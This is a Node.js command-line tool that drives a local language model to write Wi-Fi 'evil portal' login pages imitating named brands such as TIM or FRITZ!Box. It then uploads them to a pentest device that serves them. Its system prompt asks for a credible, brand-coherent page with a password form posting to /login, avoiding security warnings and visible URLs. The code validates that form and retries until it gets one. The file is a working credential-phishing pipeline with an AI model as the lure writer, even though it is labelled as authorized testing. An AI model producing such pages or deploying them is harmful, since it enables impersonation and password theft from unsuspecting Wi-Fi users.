#!/usr/bin/env node
/* SPDX-License-Identifier: AGPL-3.0-or-later
 *
 * nucleo-evilportal-ai — generates a captive-portal template with a LAN LLM.
 *
 * The contract matches .claude/skills/nucleo-evilportal-ai/SKILL.md: the model receives a strict
 * system prompt, must emit HTML only, is checked for the required markers (form, password, SSID
 * token), and the output is saved under 32 KB. Optionally POSTed to a Nucleo via /api/evilportal/
 * templates with a paired-session cookie (same pin as ota.ps1).
 *
 * Usage:
 *   node tools/evilportal/generate.mjs --brand "TIM" --ssid "TIM-7AC3F1" --lang it --out tim-it.html
 *   node tools/evilportal/generate.mjs --brand "FRITZ!Box"  --ssid "FRITZ!Box 7530 1A2B" --lang it \
 *        --server ollama --model qwen2.5:7b-instruct \
 *        --out fritz-it.html --upload --host 192.168.1.42 --pin 123456
 *
 * Flags:
 *   --brand STR       what the page should imitate (operator/hotel/airport/café); REQUIRED
 *   --ssid  STR       SSID; written literally into the page via the {{SSID}} token at serve time
 *   --lang  it|en|…   output language (default: it)
 *   --brief STR       extra free-form instructions appended to the user prompt
 *   --out   PATH      where to save the HTML (default: ./tpl-<slug>.html)
 *   --server ID       ollama | lmstudio | llamacpp | jan | kobold (default: ollama)
 *   --base URL        override the server base URL
 *   --model ID        model name; default is picked by probing the server (first chat-fit model)
 *   --max-tokens N    hard cap (default 3200 — fits 32 KB page comfortably)
 *   --retries N       maximum retries if validation fails (default 2)
 *   --upload          after writing locally, POST to the Nucleo
 *   --host IP         Nucleo IP for --upload (REQUIRED when uploading)
 *   --pin  PIN        pairing PIN for --upload
 *   --name STR        template name on SD (defaults to the --out basename without .html)
 *   --dry             do not call the LLM, print the prompts and exit (debugging)
 *   -h|--help         usage
 */
import { writeFile, readFile } from 'node:fs/promises';
import { basename, dirname, join, resolve } from 'node:path';
import { fileURLToPath } from 'node:url';

const __dirname = dirname(fileURLToPath(import.meta.url));
const ROOT = resolve(__dirname, '..', '..');

// ---- CLI ---------------------------------------------------------------------
function parseArgs(argv) {
  const a = {}; const rest = [];
  for (let i = 2; i < argv.length; i++) {
    const t = argv[i];
    if (t === '-h' || t === '--help') { a.help = true; continue; }
    if (!t.startsWith('--')) { rest.push(t); continue; }
    const k = t.slice(2);
    const next = argv[i + 1];
    if (next === undefined || next.startsWith('--')) a[k] = true;
    else { a[k] = next; i++; }
  }
  a._rest = rest; return a;
}
const args = parseArgs(process.argv);
if (args.help || !args.brand) { console.log(await readFile(fileURLToPath(import.meta.url), 'utf8').then(s => s.split(/\* Usage:/)[1].split('\n *\n')[0].replace(/^ \* ?/gm, ''))); process.exit(args.help ? 0 : 1); }

const BRAND  = String(args.brand);
const SSID   = String(args.ssid || '{{SSID}}');
const LANG   = String(args.lang || 'it');
const BRIEF  = args.brief ? String(args.brief) : '';
const SLUG   = (args.name || basename(String(args.out || BRAND), '.html')).toLowerCase().replace(/[^a-z0-9._-]+/g, '-').replace(/^-+|-+$/g, '').slice(0, 48) || 'tpl';
const OUT    = resolve(args.out ? String(args.out) : `tpl-${SLUG}.html`);
const SERVER = String(args.server || 'ollama');
const BASES  = {
  ollama:   { base: 'http://localhost:11434', chat: '/api/chat',          list: '/api/tags',    native: true  },
  lmstudio: { base: 'http://localhost:1234',  chat: '/v1/chat/completions', list: '/v1/models', native: false },
  llamacpp: { base: 'http://localhost:8080',  chat: '/v1/chat/completions', list: '/v1/models', native: false },
  jan:      { base: 'http://localhost:1337',  chat: '/v1/chat/completions', list: '/v1/models', native: false },
  kobold:   { base: 'http://localhost:5001',  chat: '/v1/chat/completions', list: '/v1/models', native: false },
};
const SRV    = BASES[SERVER]; if (!SRV) { console.error(`unknown --server ${SERVER}`); process.exit(2); }
const BASE   = String(args.base || SRV.base);
const MAX_T  = Number(args['max-tokens'] || 3200);
const RETR   = Number(args.retries || 2);
const DRY    = !!args.dry;
const UPLOAD = !!args.upload;

// ---- prompts (match SKILL.md) ------------------------------------------------
const SYS = `You produce ONLY the HTML of a Wi-Fi captive-portal login page for AUTHORIZED security testing.
Output format: valid HTML starting with <!doctype html>, nothing before or after.
No markdown, no backticks, no explanations, no leading "Here is", no trailing commentary.
Constraints:
- Full self-contained HTML page, under 32 KB total.
- No external assets: all CSS inline in a <style> tag; omit images or use tiny inline SVG only.
- Must contain <meta name="viewport" content="width=device-width,initial-scale=1">.
- Must contain a form with method="POST" action="/login" with an email-like input and a password input (type="password").
- Use the literal token {{SSID}} wherever the Wi-Fi network name should appear (the device substitutes it).
- Credible, brand-coherent look (operator / hotel / airport / café / guest Wi-Fi) matching the brief.
- Language: respect the brief; default Italian.
- No alarmist "security" language, no visible URLs, no JavaScript that validates or sends data elsewhere.
- At least one visible call-to-action button that submits the form.`;

const USR = (nudge = '') => `Brand/target: ${BRAND}
SSID target: ${SSID}
Language: ${LANG}
Extra brief (optional): ${BRIEF}${nudge ? `
Previous attempt rejected — fix this: ${nudge}
Return ONLY the HTML. No prose.` : ''}`;

if (DRY) {
  console.log('--- SYSTEM ---\n' + SYS + '\n\n--- USER ---\n' + USR());
  process.exit(0);
}

// ---- probe server + pick a model --------------------------------------------
async function probeServer() {
  const url = BASE + SRV.list;
  const r = await fetch(url, { cache: 'no-store' }).catch(() => null);
  if (!r || !r.ok) { console.error(`server ${SERVER} not reachable at ${BASE} (list ${SRV.list})`); process.exit(3); }
  const j = await r.json().catch(() => ({}));
  if (SRV.native) return (j.models || []).map(m => m.name || m.model);
  return (j.data || []).map(m => m.id);
}

function rankModelsForChat(ids) {
  // Prefer qwen > llama/gemma/mistral > phi; prefer sizes in 7-14 B; penalize code-only.
  const bad = /embed|rerank|whisper|tts|bge|e5-|clip|guard|ocr|coder|code-/i;
  const b = (s) => {
    const t = String(s).toLowerCase();
    if (bad.test(t)) return -1;
    let sc = 0;
    if (/qwen/.test(t)) sc += 40;
    if (/llama|gemma|mistral|phi/.test(t)) sc += 20;
    const m = t.match(/(\d+(?:\.\d+)?)\s*b/);
    const bb = m ? +m[1] : null;
    if (bb != null) sc += bb >= 3 && bb <= 14 ? 30 : -Math.abs(bb - 9) * 2;
    if (/instruct|chat/.test(t)) sc += 10;
    return sc;
  };
  return ids.filter(s => b(s) >= 0).sort((a, c) => b(c) - b(a));
}

// ---- call the model -----------------------------------------------------------
async function chat(model, nudge = '') {
  const url = BASE + SRV.chat;
  const body = SRV.native
    ? { model, messages: [{ role: 'system', content: SYS }, { role: 'user', content: USR(nudge) }],
        stream: false, think: false, options: { num_ctx: 8192, num_predict: MAX_T, temperature: 0.5 } }
    : { model, messages: [{ role: 'system', content: SYS }, { role: 'user', content: USR(nudge) }],
        stream: false, max_tokens: MAX_T, temperature: 0.5 };
  const r = await fetch(url, { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify(body) });
  if (!r.ok) throw new Error(`${SERVER} chat ${r.status}: ${await r.text().catch(() => '')}`);
  const j = await r.json();
  if (SRV.native) return String(j.message?.content || '');
  return String(j.choices?.[0]?.message?.content || '');
}

// ---- clean + validate --------------------------------------------------------
function clean(html) {
  // strip fenced ```html ... ``` wrappers some models still emit
  let s = String(html).trim();
  const fence = s.match(/^```(?:html)?\s*([\s\S]*?)\s*```$/i);
  if (fence) s = fence[1].trim();
  // some models prepend "Here is the HTML:" — drop up to the first '<'
  const lt = s.indexOf('<');
  if (lt > 0 && lt < 200) s = s.slice(lt);
  // strip any <think>...</think> or <reasoning>...</reasoning> leaks
  s = s.replace(/<(think|reasoning)>[\s\S]*?<\/\1>\s*/gi, '');
  return s;
}

function validate(html) {
  const problems = [];
  if (!html) problems.push('empty response');
  if (html && html[0] !== '<') problems.push('does not start with "<"');
  if (html && html.length > 32 * 1024) problems.push(`too large (${html.length} B > 32768)`);
  if (!/<form[\s\S]*?action\s*=\s*["']\/login["']/i.test(html)) problems.push('missing <form action="/login">');
  if (!/<form[\s\S]*?method\s*=\s*["']?post/i.test(html)) problems.push('missing method="POST" on <form>');
  if (!/type\s*=\s*["']?password["']?/i.test(html)) problems.push('missing <input type="password">');
  if (!/name\s*=\s*["'][a-z]*(user|email|mail|login|phone|tel|account|name|id)/i.test(html)) problems.push('missing user/email-like input name');
  if (!/{{\s*SSID\s*}}/.test(html)) problems.push('missing {{SSID}} token (the engine substitutes it)');
  if (!/<meta[^>]+viewport/i.test(html)) problems.push('missing <meta viewport>');
  if (/<script[^>]*\ssrc\s*=/i.test(html)) problems.push('external <script src=> is not allowed');
  if (/<link[^>]+rel\s*=\s*["']?stylesheet[\s\S]*?\shref\s*=\s*["']https?:/i.test(html)) problems.push('external stylesheet is not allowed');
  return problems;
}

// ---- upload ------------------------------------------------------------------
async function upload(host, pin, name, html) {
  // mirrors ota.ps1 pairing: POST /api/pair {pin} -> cookie; then POST the template body.
  const base = host.startsWith('http') ? host : `http://${host}`;
  const pair = await fetch(`${base}/api/pair`, { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ pin }) });
  if (!pair.ok) throw new Error(`pair ${pair.status}`);
  const cookie = pair.headers.get('set-cookie') || '';
  const r = await fetch(`${base}/api/evilportal/templates?name=${encodeURIComponent(name)}`, { method: 'POST', headers: { 'content-type': 'text/html', cookie }, body: html });
  const t = await r.text();
  if (!r.ok) throw new Error(`upload ${r.status}: ${t}`);
  return t;
}

// ---- run --------------------------------------------------------------------
(async () => {
  console.log(`[1/3] probing ${SERVER} at ${BASE} ...`);
  const ids = await probeServer();
  if (!ids.length) { console.error(`no models on ${SERVER}. "ollama pull qwen2.5:7b-instruct" or similar.`); process.exit(4); }
  const picked = args.model ? String(args.model) : rankModelsForChat(ids)[0];
  if (!picked) { console.error(`no chat-fit model among: ${ids.join(', ')}`); process.exit(5); }
  console.log(`      model: ${picked}`);

  let html = '', problems = [], attempts = 0, nudge = '';
  for (attempts = 0; attempts <= RETR; attempts++) {
    console.log(`[2/3] generating${attempts ? ` (retry ${attempts})` : ''} ...`);
    const raw = await chat(picked, nudge);
    html = clean(raw);
    problems = validate(html);
    if (!problems.length) break;
    nudge = problems.join('; ');
    console.log(`      validation: ${problems.length} issue(s) -> ${nudge}`);
  }
  if (problems.length) { console.error(`[FAIL] still invalid after ${attempts} retries: ${problems.join('; ')}`); process.exit(6); }
  console.log(`      ok: ${html.length} B`);

  await writeFile(OUT, html, 'utf8');
  console.log(`[3/3] wrote ${OUT}`);

  if (UPLOAD) {
    if (!args.host || !args.pin) { console.error('--upload needs --host and --pin'); process.exit(7); }
    const name = SLUG + '.html';
    console.log(`      uploading as ${name} to ${args.host} ...`);
    const t = await upload(String(args.host), String(args.pin), name, html);
    console.log(`      server: ${t}`);
  }
})().catch(e => { console.error(e.message || e); process.exit(1); });
